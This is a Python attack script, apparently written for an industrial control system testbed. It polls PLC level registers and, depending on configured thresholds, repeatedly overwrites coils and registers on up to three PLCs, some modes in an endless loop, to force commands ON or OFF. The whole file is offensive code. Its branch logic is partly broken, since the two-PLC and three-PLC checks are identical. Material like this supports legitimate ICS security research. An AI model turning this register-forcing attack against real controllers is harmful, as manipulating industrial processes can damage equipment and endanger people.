#!/usr/bin/env python3
from functools import partial
import configparser

def attack(ctx):  

    def on_level_change_plc1(value: int):

        # Read from config.ini
        config = configparser.ConfigParser()
        config.read('config.ini')
        plc = "plc1"
        address = "0.0.0.0:5023"
        
        pckt_number = config.get('params', 'packets_number')
        pckt_value = int(config.get('params', 'packets_value'))

        if(pckt_number == "loop"): 
            while(True):
                case = 0
                print('PLC 1 level value', value)
                
                if checkTrigger():
                    # Trigger checked
                    if(config.get('params', 'coil1_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil1_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                        
                    elif(case == 1): # Only sup limit
                        if(value >= int(config.get('params', 'coil1_sup_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(case == 2): # Only inf limit
                        if(value <= int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil1_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil1_inf_limit'))):
                                value +=1
                      
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, plc, address)

        else:
            # Pckt number != loop
            ct = 0
            n = int(pckt_number)
            while(ct < n):
                case = 0
                print('PLC 1 level value', value)
                
                if checkTrigger():
                    # Trigger checked
                    if(config.get('params', 'coil1_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil1_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                        
                    elif(case == 1): # Only sup limit
                        if(value >= int(config.get('params', 'coil1_sup_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(case == 2): # Only inf limit
                        if(value <= int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil1_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil1_inf_limit'))):
                                value +=1 
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, plc, address)
                ct = ct + 1
                
    def on_level_change_plc2(value:int):

        # Read from config.ini
        config = configparser.ConfigParser()
        config.read('config.ini')
        plc = "plc2"
        address = "0.0.0.0:5022"
        
        pckt_number = config.get('params', 'packets_number')
        pckt_value = int(config.get('params', 'packets_value'))

        if(pckt_number == "loop"): 
            while(True):
                case = 0
                print('PLC 2 level value', value)
                
                if checkTrigger():
                    # Trigger checked
                    if(config.get('params', 'coil2_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil2_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                        
                    elif(case == 1): # Only sup limit
                        if(value >= int(config.get('params', 'coil2_sup_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(case == 2): # Only inf limit
                        if(value <= int(config.get('params', 'coil2_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil2_sup_limit')) and value > int(config.get('params', 'coil2_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil2_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil2_inf_limit'))):
                                value +=1
                    
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, plc, address)

        else:
            # Pckt number != loop
            ct = 0
            n = int(pckt_number)
            while(ct < n):
                case = 0
                print('PLC 2 level value', value)
                
                if checkTrigger():
                    # Trigger checked
                    if(config.get('params', 'coil2_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil2_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                        
                    elif(case == 1): # Only sup limit
                        if(value >= int(config.get('params', 'coil2_sup_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            value +=1
                        
                    elif(case == 2): # Only inf limit
                        if(value <= int(config.get('params', 'coil2_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            value -=1
                                                            
                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil2_sup_limit')) and value > int(config.get('params', 'coil2_inf_limit'))):
                            trigger_operation_plc(pckt_value, plc, address)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil2_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil2_inf_limit'))):
                                value +=1
                    
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, plc, address)
                ct = ct + 1
                
                
    def on_level_change_plc3(value:int):

            # Read from config.ini
            config = configparser.ConfigParser()
            config.read('config.ini')
            plc = "plc3"
            address = "0.0.0.0:5021"
            
            
            pckt_number = config.get('params', 'packets_number')
            pckt_value = int(config.get('params', 'packets_value'))

            if(pckt_number == "loop"): 
                while(True):
                    case = 0
                    print('PLC 3 level value', value)
                    
                    if checkTrigger():
                        # Trigger checked
                        if(config.get('params', 'coil3_sup_limit') != ""):
                            case += 1
                        if(config.get('params', 'coil3_inf_limit') !=""):
                            case += 2

                        if(case == 0): # No limits
                            print("No limits!")   
                            
                        elif(case == 1): # Only sup limit
                            if(value >= int(config.get('params', 'coil3_sup_limit'))):
                                trigger_operation_plc(pckt_value, plc, address)
                            else:
                                print("Waiting for triggers...")
                                value +=1
                            
                        elif(case == 2): # Only inf limit
                            if(value <= int(config.get('params', 'coil3_inf_limit'))):
                                trigger_operation_plc(pckt_value, plc, address)
                            else:
                                print("Waiting for triggers...")
                                value -=1
                                                                
                        elif(case == 3): # Both limits
                            if(value < int(config.get('params', 'coil3_sup_limit')) and value > int(config.get('params', 'coil3_inf_limit'))):
                                trigger_operation_plc(pckt_value, plc, address)
                            else:
                                print("Waiting for triggers...")
                                if(value > int(config.get('params', 'coil3_sup_limit'))):
                                    value -= 1
                                elif(value < int(config.get('params', 'coil3_inf_limit'))):
                                    value +=1
                        
                    else:
                        # Trigger unchecked - only main conditions
                        trigger_operation_plc(pckt_value, plc, address)

            else:
                # Pckt number != loop
                ct = 0
                n = int(pckt_number)
                while(ct < n):
                    case = 0
                    print('PLC 3 level value', value)
                    
                    if checkTrigger():
                        # Trigger checked
                        if(config.get('params', 'coil3_sup_limit') != ""):
                            case += 1
                        if(config.get('params', 'coil3_inf_limit') !=""):
                            case += 2

                        if(case == 0): # No limits
                            print("No limits!")   
                            
                        elif(case == 1): # Only sup limit
                            if(value >= int(config.get('params', 'coil3_sup_limit'))):
                                trigger_operation_plc(pckt_value, plc, address)
                            else:
                                print("Waiting for triggers...")
                                value +=1
                            
                        elif(case == 2): # Only inf limit
                            if(value <= int(config.get('params', 'coil3_inf_limit'))):
                                trigger_operation_plc(pckt_value, plc, address)
                            else:
                                print("Waiting for triggers...")
                                value -=1
                                                                
                        elif(case == 3): # Both limits
                            if(value < int(config.get('params', 'coil3_sup_limit')) and value > int(config.get('params', 'coil3_inf_limit'))):
                                trigger_operation_plc(pckt_value, plc, address)
                            else:
                                print("Waiting for triggers...")
                                if(value > int(config.get('params', 'coil3_sup_limit'))):
                                    value -= 1
                                elif(value < int(config.get('params', 'coil3_inf_limit'))):
                                    value +=1
                        
                    else:
                        # Trigger unchecked - only main conditions
                        trigger_operation_plc(pckt_value, plc, address)
                    ct = ct + 1
    

    def checkTrigger():
        
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        # Allocate trigger params (if present)
        coil_1_sup_limit = config.get('params', 'coil1_sup_limit')
        coil_1_inf_limit = config.get('params', 'coil1_inf_limit')
        coil_2_sup_limit = config.get('params', 'coil2_sup_limit')
        coil_2_inf_limit = config.get('params', 'coil2_inf_limit')
        coil_3_sup_limit = config.get('params', 'coil3_sup_limit')
        coil_3_inf_limit = config.get('params', 'coil3_inf_limit')

        if(coil_1_sup_limit == "" and coil_1_inf_limit == "" and coil_2_sup_limit == "" and coil_2_inf_limit == ""
            and coil_3_sup_limit =="" and coil_3_inf_limit == ""):
            return False # No triggers

        return True
    
    
    
    def trigger_operation_plc(p_val, plc, address):
        
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        plc_choice = ""
        if(address == config.get('plc', 'plc1')):
            plc_choice = config.get('params', 'plc1_choice')
            sett = "plc1"
        elif(address == config.get('plc', 'plc2')):
            plc_choice = config.get('params', 'plc2_choice')
            sett = "plc2"
        elif(address == config.get('plc', 'plc3')):
            plc_choice = config.get('params', 'plc3_choice')
            sett = "plc3"
            
            
        coil = []
        reg = []
        reg_d = []
                
        # Extracting choices coils/registers
        choices_list = [choice.strip() for choice in plc_choice.split(',')]
        
        #print(choices_list)
        
        for choice in choices_list:
            if choice.startswith('c'):
                temp = ctx.register(sett, 'C', int(choice[-1]))
                temp.write(p_val)
            elif choice.startswith('r'):
                temp = ctx.register(sett, 'H', int(choice[-1]))
                temp.write(p_val)
            elif choice.startswith('m'):
                temp = ctx.register(sett, 'D', int(choice[-1]))
                temp.write(p_val)
                
            print(f"Writing on %QX0.{int(choice[-1])} - {plc}")
        
        #TODO register write          
        
        if p_val == 0:
            print('COMMAND OFF - Value wrote:', p_val)
        elif p_val == 1:
            print('COMMAND ON - Value wrote:', p_val)

    
    # Read from config.ini
    config = configparser.ConfigParser()
    config.read('config.ini')

    plc_values = {}

    for plc_key in config['plc']:
        plc_values[plc_key] = config.get('plc', plc_key)
    
    #print(plc_values)  

    # Allocate all IW registers
    if(len(plc_values)== 1):
        plc_1_input_register = ctx.register('plc1', 'I', 0)
    elif(len(plc_values)== 2):
        plc_1_input_register = ctx.register('plc1', 'I', 0)
        plc_2_input_register = ctx.register('plc2', 'I', 0)
    else:
        plc_1_input_register = ctx.register('plc1', 'I', 0)
        plc_2_input_register = ctx.register('plc2', 'I', 0)
        plc_3_input_register = ctx.register('plc3', 'I', 0)

    print("done")
    # PLC attack
    # ONE PLC selected
    if config.get('params', 'plc1_choice') != "" or config.get('params', 'plc2_choice') != "" or config.get('params', 'plc3_choice') != "":
        print("Attacking one plc...")

        if(config.get('plc', 'plc1') == "0.0.0.0:5023"):
            plc_1_input_register.start_polling(500, on_level_change_plc1)
        elif(config.get('plc', 'plc1') == "0.0.0.0:5022"):
            plc_1_input_register.start_polling(500, on_level_change_plc2)
        elif(config.get('plc', 'plc1') == "0.0.0.0:5021"):
            plc_1_input_register.start_polling(500, on_level_change_plc3)
        



    # TWO PLCs selected
    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
        print("Attacking two plcs...")

    # THREE PLCs selected 
    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
        print("Attacking three plcs...")

    

